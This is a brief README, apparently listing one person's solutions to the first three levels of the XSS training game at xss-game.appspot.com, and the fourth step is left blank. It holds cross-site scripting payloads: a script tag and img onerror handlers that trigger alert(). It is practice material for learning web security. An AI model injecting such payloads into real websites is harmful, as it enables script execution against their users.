# Game-xss
My solutions for https://xss-game.appspot.com

##Step 1
<script>alert(1);</script>
##Step 2
<img src="forbidden" onerror="alert('1')" />
##Step 3
Replace
<img src="/static/level3/cloud3.jpg"> to
<img src="/static/level3/#6.jpg" onerror="alert(1)">
##Step 4
